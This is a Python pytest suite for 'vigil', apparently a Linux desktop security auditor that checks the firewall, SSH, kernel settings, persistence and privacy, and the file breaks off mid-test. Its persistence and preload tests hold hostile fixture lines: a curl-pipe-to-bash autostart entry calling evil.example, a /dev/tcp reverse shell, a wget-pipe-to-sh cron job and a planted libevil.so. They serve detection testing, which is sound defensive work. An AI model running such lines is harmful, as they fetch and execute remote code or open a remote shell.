"""Tests for bin/vigil. Run with: python3 -m pytest tests -q

Every check runs against a fake filesystem under tmp_path: vigil.ROOT is the
prefix for /etc, /proc, /sys and /var, vigil.HOME is a fake home directory,
and systemctl / child processes are replaced with fakes.
"""
import base64
import importlib.machinery
import importlib.util
import json
import os
import re
import stat
import struct
import threading
from pathlib import Path

import sys

import pytest

sys.dont_write_bytecode = True          # keep bin/ free of __pycache__
REPO = Path(__file__).resolve().parents[1]


def load_vigil():
    loader = importlib.machinery.SourceFileLoader("vigil", str(REPO / "bin" / "vigil"))
    spec = importlib.util.spec_from_loader("vigil", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def v(tmp_path, monkeypatch):
    mod = load_vigil()
    root = tmp_path / "root"
    home = tmp_path / "home"
    root.mkdir()
    home.mkdir(mode=0o700)
    mod.ROOT = str(root)
    mod.HOME = str(home)
    mod.USER = "alice"
    units = {}
    mod.UNITS = units

    def fake_systemctl(*args):
        if args[0] in ("is-active", "is-enabled"):
            return units.get((args[0], args[1]), "inactive" if args[0] == "is-active" else "disabled")
        return ""

    # Replace the memoised wrapper itself, so tests can change units mid-test.
    monkeypatch.setattr(mod, "systemctl", fake_systemctl)
    commands = {}
    mod.COMMANDS = commands

    def fake_run(argv, timeout=8, limit=0):
        key = tuple(argv)
        if key in commands:
            return commands[key]
        return None, ""

    monkeypatch.setattr(mod, "run", fake_run)
    trusted = set()
    mod.TRUSTED = trusted
    monkeypatch.setattr(mod, "is_trusted_executable", lambda p: p in trusted)
    return mod


def put(path, text, mode=0o644):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    os.chmod(path, mode)
    return path


def sysfile(v, rel, text, mode=0o644):
    return put(v.ROOT + rel, text, mode)


def homefile(v, rel, text, mode=0o644):
    return put(os.path.join(v.HOME, rel), text, mode)


# --------------------------------------------------------------------------
# Safe file reading

def test_read_file_refuses_symlink(v, tmp_path):
    target = put(tmp_path / "secret", "x")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(v.Refused):
        v.read_file(str(link))
    assert v.read_file(str(link), follow=True) == b"x"


def test_read_file_does_not_hang_on_fifo(v, tmp_path):
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    done = []

    def go():
        try:
            v.read_file(str(fifo), follow=True)
        except v.Refused:
            done.append("refused")

    t = threading.Thread(target=go, daemon=True)
    t.start()
    t.join(3)
    assert done == ["refused"]


def test_read_file_rejects_oversize(v, tmp_path):
    p = put(tmp_path / "big", "a" * 101)
    with pytest.raises(v.Refused):
        v.read_file(str(p), limit=100)
    assert v.read_file(str(p), limit=101) == b"a" * 101


def test_read_file_missing_is_none(v, tmp_path):
    assert v.read_file(str(tmp_path / "nope")) is None


def test_clean_strips_controls_and_caps(v):
    s = v.clean("a\x1b[31mb‮c" + "x" * 500, 20)
    assert "\x1b" not in s and "‮" not in s and len(s) <= 20


# --------------------------------------------------------------------------
# Running commands (real subprocesses)

def test_run_rejects_relative_argv():
    mod = load_vigil()
    assert mod.run(["sh", "-c", "true"]) == (None, "")


def test_run_caps_output():
    mod = load_vigil()
    rc, out = mod.run(["/usr/bin/yes"], timeout=5, limit=1000)
    assert rc is None and out == ""


def test_run_times_out():
    mod = load_vigil()
    rc, _ = mod.run(["/usr/bin/sleep", "5"], timeout=0.5)
    assert rc is None


def test_run_ok():
    mod = load_vigil()
    assert mod.run(["/usr/bin/printf", "hi"]) == (0, "hi")


# --------------------------------------------------------------------------
# Harden checks

def ufw(v, enabled="yes", policy="DROP", active="active"):
    sysfile(v, "/etc/ufw/ufw.conf", "ENABLED=%s\n" % enabled)
    sysfile(v, "/etc/default/ufw", 'DEFAULT_INPUT_POLICY="%s"\n' % policy)
    sysfile(v, "/usr/bin/ufw", "")
    v.UNITS[("is-active", "ufw.service")] = active


def test_firewall_pass(v):
    ufw(v)
    assert v.check_firewall()["status"] == "pass"


def test_firewall_off(v):
    ufw(v, enabled="no", active="inactive")
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "firewall-on"


def test_firewall_accepting(v):
    ufw(v, policy="ACCEPT")
    assert v.check_firewall()["status"] == "warn"


def test_firewall_missing(v):
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "install-ufw"


def test_firewall_nftables_counts(v):
    v.UNITS[("is-active", "nftables.service")] = "active"
    assert v.check_firewall()["status"] == "pass"


def test_kernel_sysctl(v):
    for name, _, rec, _ in v.KERNEL_SYSCTLS:
        sysfile(v, "/proc/sys/" + name.replace(".", "/"), "%d\n" % rec)
    assert v.check_kernel_sysctl()["status"] == "pass"
    sysfile(v, "/proc/sys/kernel/kptr_restrict", "0\n")
    c = v.check_kernel_sysctl()
    assert c["status"] == "warn" and "kptr_restrict" in c["detail"] and c["fix"]["action"] == "sysctl-harden"


def test_kernel_sysctl_unreadable(v):
    assert v.check_kernel_sysctl()["status"] == "unknown"


def test_llmnr(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_llmnr()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nLLMNR=no\n")
    assert v.check_llmnr()["status"] == "pass"


def test_ssh_server_off(v):
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_dropin_wins(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config", "PasswordAuthentication yes\nPermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "fail"
    sysfile(v, "/etc/ssh/sshd_config.d/00-a.conf",
            "PermitRootLogin no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n")
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_ignores_match_blocks(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config",
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nMatch User bob\n  PermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "pass"


def ssh_string(b):
    return struct.pack(">I", len(b)) + b


def openssh_key(cipher=b"none", ktype=b"ssh-ed25519"):
    pub = ssh_string(ktype) + ssh_string(b"\x00" * 32)
    blob = (b"openssh-key-v1\x00" + ssh_string(cipher) + ssh_string(b"none" if cipher == b"none" else b"bcrypt")
            + ssh_string(b"") + struct.pack(">I", 1) + ssh_string(pub) + ssh_string(b"\x00" * 64))
    body = base64.b64encode(blob).decode()
    return "-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----\n" % body


def test_private_key_parser(v):
    assert v._private_key_state(openssh_key().encode())[:2] == (True, False)
    assert v._private_key_state(openssh_key(b"aes256-ctr").encode())[:2] == (True, True)
    assert v._private_key_state(openssh_key(ktype=b"sk-ssh-ed25519@openssh.com").encode())[:2] == (True, True)
    pem = "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nabc\n-----END RSA PRIVATE KEY-----\n"
    assert v._private_key_state(pem.encode())[:2] == (True, True)
    assert v._private_key_state(b"-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n")[:2] == (True, False)
    assert v._private_key_state(b"ssh-ed25519 AAAA user@host\n")[0] is False
    # Truncated or garbage blobs never raise.
    assert v._private_key_state(b"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END")[0] is True


def test_ssh_keys_statuses(v):
    assert v.check_ssh_keys()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o700)
    homefile(v, ".ssh/id_ed25519", openssh_key(b"aes256-ctr"), 0o600)
    homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    assert v.check_ssh_keys()["status"] == "pass"
    homefile(v, ".ssh/id_work", openssh_key(), 0o600)
    assert v.check_ssh_keys()["status"] == "warn"
    os.chmod(os.path.join(v.HOME, ".ssh/id_work"), 0o644)
    c = v.check_ssh_keys()
    assert c["status"] == "fail" and c["fix"]["action"] == "ssh-perms"


def test_fix_ssh_perms_only_touches_keys_and_never_follows_links(v, tmp_path):
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o755)
    key = homefile(v, ".ssh/id_ed25519", openssh_key(), 0o644)
    pub = homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    outside = put(tmp_path / "outside_key", openssh_key(), 0o644)
    os.symlink(outside, os.path.join(v.HOME, ".ssh", "linked"))
    res = v.run_fix("ssh-perms")
    assert res["ok"], res
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".ssh")).st_mode) == 0o700
    assert stat.S_IMODE(key.stat().st_mode) == 0o600
    assert stat.S_IMODE(pub.stat().st_mode) == 0o644
    assert stat.S_IMODE(outside.stat().st_mode) == 0o644


def test_fix_refuses_symlinked_ssh_dir(v, tmp_path):
    real = tmp_path / "elsewhere"
    real.mkdir(mode=0o755)
    os.symlink(real, os.path.join(v.HOME, ".ssh"))
    res = v.run_fix("ssh-perms")
    assert not res["ok"]
    assert stat.S_IMODE(real.stat().st_mode) == 0o755


def test_gnupg(v):
    assert v.check_gnupg()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".gnupg"), 0o755)
    os.chmod(os.path.join(v.HOME, ".gnupg"), 0o755)
    assert v.check_gnupg()["status"] == "warn"
    assert v.run_fix("gnupg-perms")["ok"]
    assert v.check_gnupg()["status"] == "pass"


def test_screen_lock(v):
    assert v.check_screen_lock()["status"] == "unknown"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    assert v.check_screen_lock()["status"] == "pass"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 3600}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    homefile(v, ".local/state/omarchy/indicators/stay-awake", "")
    c = v.check_screen_lock()
    assert c["status"] == "warn" and c["fix"]["action"] == "allow-idle"


def test_faillock(v):
    assert v.check_faillock()["status"] == "na"
    sysfile(v, "/etc/pam.d/system-auth",
            "auth required pam_faillock.so preauth silent deny=10 unlock_time=120\n")
    c = v.check_faillock()
    assert c["status"] == "pass" and "10" in c["summary"]
    sysfile(v, "/etc/pam.d/system-auth", "auth required pam_unix.so\n")
    assert v.check_faillock()["status"] == "warn"


def test_passwordless_sudo(v):
    assert v.check_passwordless_sudo()["status"] == "na"
    v.TRUSTED.add(v.ROOT + "/usr/bin/omarchy-sudo-passwordless")
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (0, "")
    assert v.check_passwordless_sudo()["status"] == "fail"
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (1, "")
    assert v.check_passwordless_sudo()["status"] == "pass"


def test_docker_group(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\ndocker:x:970:bob,alice\n")
    assert v.check_docker_group()["status"] == "warn"
    sysfile(v, "/etc/group", "docker:x:970:bob,alicex\n")
    assert v.check_docker_group()["status"] == "pass"


def test_updates(v):
    import time as _t
    today = _t.strftime("%Y-%m-%d")
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % today)
    assert v.check_updates()["status"] == "pass"
    sysfile(v, "/var/log/pacman.log", "[2020-01-01T10:00:00+0000] [PACMAN] starting full system upgrade\n")
    assert v.check_updates()["status"] == "fail"



def test_listeners_skip_loopback(v):
    tcp = ("  sl  local_address rem_address   st\n"
           "   0: 0100007F:0277 00000000:0000 0A\n"          # 127.0.0.1:631
           "   1: 3500007F:0035 00000000:0000 0A\n"          # 127.0.0.53:53
           "   2: 00000000:0016 00000000:0000 0A\n"          # 0.0.0.0:22
           "   3: 00000000:1F90 00000000:0000 01\n")         # established, ignored
    tcp6 = ("  sl  local_address rem_address st\n"
            "   0: 00000000000000000000000001000000:1F90 00000000000000000000000000000000:0000 0A\n"
            "   1: 00000000000000000000000000000000:D125 00000000000000000000000000000000:0000 0A\n")
    sysfile(v, "/proc/net/tcp", tcp)
    sysfile(v, "/proc/net/tcp6", tcp6)
    assert v._listeners() == [("tcp", 22), ("tcp", 53541)]
    c = v.check_listeners()
    assert c["status"] == "warn" and "22" in c["detail"]


# --------------------------------------------------------------------------
# Scan checks

def test_persistence_flags_download_and_run(v):
    homefile(v, ".bashrc", "# curl https://x | sh is fine in a comment\nalias ll='ls -l'\n")
    assert v.check_persistence()["status"] == "pass"
    homefile(v, ".config/autostart/updater.desktop",
             "[Desktop Entry]\nExec=sh -c 'curl -fsSL https://evil.example/x | bash'\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "autostart/updater.desktop:2" in c["detail"]


def test_persistence_follows_dotfile_symlink(v, tmp_path):
    real = put(tmp_path / "dotfiles" / "bashrc", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    os.symlink(real, os.path.join(v.HOME, ".bashrc"))
    assert v.check_persistence()["status"] == "warn"


def test_persistence_crontab(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/crontab")
    v.COMMANDS[("/usr/bin/crontab", "-l")] = (0, "*/5 * * * * wget -qO- http://x/y | sh\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "crontab:1" in c["detail"]


def test_ld_preload(v):
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "# comment\n")
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    assert v.check_ld_preload()["status"] == "fail"



# --------------------------------------------------------------------------
# Privacy checks

def test_dns_fallback(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_dns_fallback()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nFallbackDNS=\n")
    assert v.check_dns_fallback()["status"] == "pass"


def test_connectivity_and_mac(v):
    v.UNITS[("is-active", "NetworkManager.service")] = "active"
    sysfile(v, "/usr/lib/NetworkManager/conf.d/20-connectivity.conf",
            "[connectivity]\nuri=http://ping.archlinux.org/nm-check.txt\n")
    assert v.check_connectivity_check()["status"] == "info"
    sysfile(v, "/etc/NetworkManager/conf.d/90-x.conf", "[connectivity]\nenabled=false\n")
    assert v.check_connectivity_check()["status"] == "pass"
    assert v.check_mac_randomization()["status"] == "warn"
    sysfile(v, "/etc/NetworkManager/conf.d/91-x.conf", "[connection]\nwifi.cloned-mac-address=stable\n")
    assert v.check_mac_randomization()["status"] == "pass"


def test_avahi(v):
    assert v.check_avahi()["status"] == "pass"
    v.UNITS[("is-active", "avahi-daemon.service")] = "active"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\n#disable-publishing=no\n")
    assert v.check_avahi()["status"] == "warn"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\ndisable-publishing=yes\n")
    assert v.check_avahi()["status"] == "pass"


def test_optout_roundtrip(v):
    assert v.check_opt_out()["status"] == "info"
    assert v.run_fix("optout-on")["ok"]
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    assert path.read_text() == v.OPT_OUT_TEXT
    assert v.check_opt_out()["fix"]["action"] == "optout-off"
    assert v.run_fix("optout-off")["ok"]
    assert not path.exists()


def test_optout_off_leaves_edited_file(v):
    v.run_fix("optout-on")
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    path.write_text(v.OPT_OUT_TEXT + "export MINE=1\n")
    res = v.run_fix("optout-off")
    assert not res["ok"] and path.exists()


def test_optout_on_does_not_write_through_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".config/uwsm/env.d")
    d.mkdir(parents=True)
    os.symlink(victim, d / v.OPT_OUT_NAME)
    assert v.run_fix("optout-on")["ok"]
    assert victim.read_text() == "must survive"
    assert not (d / v.OPT_OUT_NAME).is_symlink()


# --------------------------------------------------------------------------
# Clean

def test_clean_thumbnails_stays_inside(v, tmp_path):
    keep = tmp_path / "keep"
    keep.mkdir()
    put(keep / "precious.png", "x")
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "large" / "a.png", "x")
    put(thumbs / "normal" / "b.png", "x")
    os.symlink(keep, thumbs / "escape")
    res = v.run_fix("clean-thumbnails")
    assert res["ok"], res
    assert (keep / "precious.png").exists()
    assert list(thumbs.iterdir()) == []


def test_clean_user_clears_thumbnails_and_trash(v):
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "normal" / "a.png", "x")
    put(Path(v.HOME, ".local/share/Trash/files/old.txt"), "x" * 5000)
    v.TRUSTED.add(v.sys_path("/usr/bin/gio"))
    v.COMMANDS[("/usr/bin/gio", "trash", "--empty")] = (0, "")
    res = v.run_fix("clean-user")
    assert res["ok"], res
    assert list(thumbs.iterdir()) == []
    assert "Trash emptied" in res["message"]


def test_clean_user_keeps_going_without_gio(v):
    put(Path(v.HOME, ".cache/thumbnails/normal/a.png"), "x")
    put(Path(v.HOME, ".local/share/Trash/files/old.txt"), "x" * 5000)
    res = v.run_fix("clean-user")
    assert res["ok"], res
    assert "Removed 1 thumbnail" in res["message"] and "not emptied" in res["message"]


def test_clean_user_skips_an_empty_trash(v):
    res = v.run_fix("clean-user")              # no gio, no trash: nothing to refuse
    assert res["ok"] and "trash" not in res["message"].lower(), res


def test_size_checks(v):
    assert v.check_thumbnails()["status"] == "pass"
    put(Path(v.HOME, ".cache/thumbnails/normal/a.png"), "x" * 10000)
    c = v.check_thumbnails()
    assert c["status"] == "info" and c["fix"]["action"] == "clean-thumbnails"


def test_unknown_fix_refused(v):
    assert v.run_fix("rm-rf")["ok"] is False


# --------------------------------------------------------------------------
# State

def test_state_reports_new_findings_after_baseline(v):
    ufw(v, enabled="no", active="inactive")
    first = v.audit()
    assert first["stateSaved"] and first["new"] == []
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    second = v.audit()
    assert "ld-preload" in second["new"] and "firewall" not in second["new"]
    assert v.audit()["new"] == []
    st = os.stat(os.path.join(v.HOME, ".local/state/omarchy-vigil/state.json"))
    assert stat.S_IMODE(st.st_mode) == 0o600


def test_peek_does_not_touch_state(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil"))


def test_state_write_replaces_planted_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(victim, d / "state.json")
    v.audit()
    assert victim.read_text() == "must survive"


def test_state_refuses_symlinked_directory(v, tmp_path):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    Path(v.HOME, ".local/state").mkdir(parents=True)
    os.symlink(elsewhere, Path(v.HOME, ".local/state/omarchy-vigil"))
    report = v.audit()
    assert report["stateSaved"] is False
    assert list(elsewhere.iterdir()) == []


# --------------------------------------------------------------------------
# Report shape and the contract with Model.js

def model_actions():
    src = (REPO / "Model.js").read_text()
    terminal = set(re.findall(r'^  "([a-z0-9-]+)": \{\n    title:', src, re.M))
    helper = set(re.findall(r'"([a-z0-9-]+)"', re.search(r"var HELPER_ACTIONS = \[(.*?)\]", src, re.S).group(1)))
    return terminal, helper


def test_every_fix_in_helper_is_known_to_model(v):
    terminal, helper = model_actions()
    src = (REPO / "bin" / "vigil").read_text()
    used_terminal = set(re.findall(r'"terminal", "([a-z0-9-]+)"', src))
    used_helper = set(re.findall(r'"helper", "([a-z0-9-]+)"', src))
    used_app = set(re.findall(r'"app", "([a-z0-9-]+)"', src))
    msrc = (REPO / "Model.js").read_text()
    for a in used_app:
        assert '"%s": {\n    app:' % a in msrc, a
    for spec in v.SCANNERS:
        used_terminal |= {spec[5], spec[6]}
    assert used_terminal <= terminal, used_terminal - terminal
    assert used_helper <= helper, used_helper - helper
    assert helper == set(v.FIXES)


def test_full_audit_shape(v):
    report = v.audit()
    json.dumps(report)
    ids = [c["id"] for c in report["checks"]]
    assert len(ids) == len(set(ids)) and len(ids) <= 80
    for c in report["checks"]:
        assert re.fullmatch(r"[a-z0-9-]{1,40}", c["id"])
        assert c["category"] in ("harden", "detect", "supply", "privacy", "care")
        assert c["status"] in ("pass", "warn", "fail", "info", "na", "unknown")
        assert c["fix"]["kind"] in ("terminal", "helper", "none")
        assert isinstance(c["weight"], int) and 0 <= c["weight"] <= 3
        assert len(c["summary"]) <= 240 and len(c["why"]) <= 400
    assert 0 <= report["score"] <= 100


def test_cli_rejects_bad_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["fix", "../../x"], ["fix"], ["audit", "--force"], []):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Pillars: ClamUI hand-off, Bumblebee, plugin inventory

def test_categories_match_pillars(v):
    cats = {c["category"] for c in v.audit(peek=True)["checks"]}
    assert cats == {"harden", "detect", "supply", "privacy", "care"}


def test_clamui_detection(v):
    c = v.check_clamui()
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "install-clamui", "label": "Install ClamUI"}
    v.TRUSTED.add(v.ROOT + "/usr/bin/flatpak")
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == "flatpak"
    c = v.check_clamui()
    assert c["status"] == "pass" and c["fix"]["kind"] == "app" and c["fix"]["action"] == "open-clamui"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.clamui_install() == "native"
    assert v.audit(peek=True)["apps"] == {"clamui": "native"}


def test_flatpak_clamui_needs_trusted_flatpak(v):
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == ""


def bumblebee(v, payload, raw=None):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID), exist_ok=True)
    homefile(v, ".local/state/omarchy/bumblebee/last-scan.json", raw if raw is not None else json.dumps(payload), 0o600)


def test_bumblebee_states(v):
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["weight"] == 0
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    assert v.check_bumblebee()["status"] == "unknown"
    bumblebee(v, {"ok": True, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "pass"
    bumblebee(v, {"ok": True, "exposure_count": 2})
    c = v.check_bumblebee()
    assert c["status"] == "fail" and "2 known-compromised" in c["summary"]
    bumblebee(v, {"ok": False, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "unknown"
    for bad in ({"ok": True, "exposure_count": True}, {"ok": True, "exposure_count": -1},
                {"ok": True, "exposure_count": "3"}, ["x"]):
        bumblebee(v, bad)
        assert v.check_bumblebee()["status"] == "unknown", bad
    bumblebee(v, None, raw="{not json")
    assert v.check_bumblebee()["status"] == "unknown"



def test_bumblebee_refuses_symlinked_cache(v, tmp_path):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    real = put(tmp_path / "fake.json", json.dumps({"ok": True, "exposure_count": 0}))
    d = Path(v.HOME, ".local/state/omarchy/bumblebee")
    d.mkdir(parents=True)
    os.symlink(real, d / "last-scan.json")
    assert v.check_bumblebee()["status"] == "unknown"


def test_bumblebee_oversized_cache(v):
    bumblebee(v, None, raw='{"ok": true, "exposure_count": 0, "pad": "' + "x" * 70000 + '"}')
    assert v.check_bumblebee()["status"] == "unknown"


def test_plugin_inventory(v):
    assert v.check_plugins()["status"] == "pass"
    base = os.path.join(v.HOME, ".config/omarchy/plugins")
    homefile(v, ".config/omarchy/plugins/acme.weather/manifest.json", json.dumps({"name": "<b>Weather</b>"}))
    homefile(v, ".config/omarchy/plugins/keasbeexd.vigil/manifest.json", json.dumps({"name": "Vigil"}))
    os.makedirs(os.path.join(base, "broken.plugin"))
    c = v.check_plugins()
    assert c["status"] == "info" and "2 third-party plugins" in c["summary"]
    assert "Vigil" not in c["detail"] and "acme.weather" in c["detail"] and "broken.plugin" in c["detail"]


# --------------------------------------------------------------------------
# Undo, reviewed warnings, score history

def test_etc_mark_matches_model(v):
    src = (REPO / "Model.js").read_text()
    assert 'var VIGIL_MARK = "%s"' % v.ETC_MARK in src


def test_undo_offered_only_for_vigil_owned_files(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    path = "/etc/systemd/resolved.conf.d/90-omarchy-vigil-llmnr.conf"
    sysfile(v, path, v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["status"] == "pass" and llmnr["undo"]["action"] == "undo-llmnr"
    sysfile(v, path, "# edited by hand\n" + v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["undo"]["action"] == ""


def test_undo_never_follows_symlink(v, tmp_path):
    real = put(tmp_path / "x.conf", "")
    real.write_text(v.ETC_MARK + "\n")
    os.makedirs(v.ROOT + "/etc/sysctl.d")
    os.symlink(real, v.ROOT + "/etc/sysctl.d/90-omarchy-vigil.conf")
    assert v.undo_available("undo-sysctl") is False


def test_sysctl_undo_shows_on_both_sysctl_checks(v):
    sysfile(v, "/etc/sysctl.d/90-omarchy-vigil.conf", v.ETC_MARK + "\nkernel.kptr_restrict=2\n")
    checks = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert checks["kernel-hardening"]["undo"]["action"] == "undo-sysctl"
    assert checks["network-hardening"]["undo"]["action"] == "undo-sysctl"


def test_avahi_undo_needs_backup(v):
    assert v.undo_available("undo-avahi") is False
    sysfile(v, v.AVAHI_BACKUP, "[publish]\n")
    assert v.undo_available("undo-avahi") is True


def port_listening(v):
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n")


def test_dismiss_warning_roundtrip(v):
    port_listening(v)
    before = v.audit()
    ports = {c["id"]: c for c in before["checks"]}["open-ports"]
    assert ports["status"] == "warn" and ports["dismissible"] and not ports["dismissed"]
    res = v.set_dismissed("open-ports", True)
    assert res["ok"], res
    after = v.audit()
    ports = {c["id"]: c for c in after["checks"]}["open-ports"]
    assert ports["dismissed"] and re.fullmatch(r"\d{4}-\d{2}-\d{2}", ports["dismissedAt"])
    assert after["score"] > before["score"] and after["counts"]["dismissed"] == 1
    assert v.set_dismissed("open-ports", False)["ok"]
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_dismissal_lapses_when_finding_changes(v):
    port_listening(v)
    v.audit()
    v.set_dismissed("open-ports", True)
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n"
                                "   1: 00000000:1F90 00000000:0000 0A\n")
    report = v.audit()
    ports = {c["id"]: c for c in report["checks"]}["open-ports"]
    assert not ports["dismissed"] and "open-ports" in report["new"]


def test_failures_and_evidence_cannot_be_dismissed(v):
    ufw(v, enabled="no", active="inactive")
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("firewall", True)["ok"] is False
    assert v.set_dismissed("ld-preload", True)["ok"] is False
    assert v.set_dismissed("nonexistent", True)["ok"] is False
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert c["firewall"]["dismissible"] is False and c["llmnr"]["dismissible"] is True


def test_dismissed_finding_does_not_notify(v):
    v.audit()                                    # baseline
    port_listening(v)
    v.set_dismissed("open-ports", True)
    assert "open-ports" not in v.audit()["new"]


def test_forged_dismissal_entries_are_ignored(v):
    port_listening(v)
    v.audit()
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["dismissed"] = [{"fp": "../../etc", "at": "x"}, "junk", {"fp": "open-ports:zz"}]
    p.write_text(json.dumps(state))
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_history_is_daily_and_capped(v):
    v.audit()
    v.audit()
    report = v.audit()
    assert len(report["history"]) == 1 and report["history"][0]["score"] == report["score"]
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["history"] = [{"at": "2026-01-%02dT10:00:00+0000" % d, "score": 50 + d} for d in range(1, 32)] + \
                       [{"at": "bad", "score": 1}, {"at": "2026-02-01", "score": 900}, {"at": "2026-02-02", "score": True}]
    p.write_text(json.dumps(state))
    hist = v.audit()["history"]
    assert len(hist) == v.HISTORY_MAX
    assert all(re.fullmatch(r"\d{4}-\d{2}-\d{2}", h["date"]) and 0 <= h["score"] <= 100 for h in hist)
    assert hist == sorted(hist, key=lambda h: h["date"])


def test_cli_dismiss_rejects_bad_ids():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["dismiss", "../x"], ["dismiss"], ["undismiss", "A"], ["dismiss", "a", "b"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Phase 4: secrets, known-bad packages, malware processes, file changes,
# plugin capabilities, arch-audit, ClamUI quarantine

def test_secrets_in_history_are_located_not_shown(v):
    token = "ghp_" + "A" * 36
